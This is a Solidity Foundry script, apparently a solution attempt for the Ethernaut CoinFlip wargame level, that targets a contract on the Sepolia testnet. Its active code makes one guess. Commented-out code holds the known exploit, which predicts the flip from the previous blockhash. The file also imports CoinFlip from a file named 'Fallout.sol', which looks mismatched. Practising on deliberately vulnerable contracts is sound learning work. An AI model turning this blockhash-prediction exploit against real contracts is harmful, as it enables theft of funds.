// SPDX-License-Identifier: MIT

pragma solidity >=0.8.24;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "./Fallout.sol";
import {console} from "forge-std/Test.sol";

interface ICoinFlip {
   function consecutiveWins() external view returns (uint256);
   function flip(bool _guess) external returns (bool);
}

contract Attacker is Script {
    address public target = 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d;
    string SEPOLIA_RPC = "wss://sepolia.drpc.org";
    uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.createSelectFork(SEPOLIA_RPC);

       ICoinFlip coinflip = ICoinFlip(target);

        vm.startBroadcast(privateKey);
      
        bool res = coinflip.flip(true);
        console.log("Flip result:", res);

        // uint256 flips = 10;

        // for (uint256 i = 0; i < flips; i++) {
        //   uint256 blockValue = uint256(blockhash(block.number - 1));
        //   uint256 res = blockValue / Factor;
        //   if(res == 1) {
        //     coinflip.flip(true);   
        //   } else {
        //     coinflip.flip(false);   
        //   }
        //   vm.roll(block.number + 1);
        // }


        vm.stopBroadcast();
    }
}
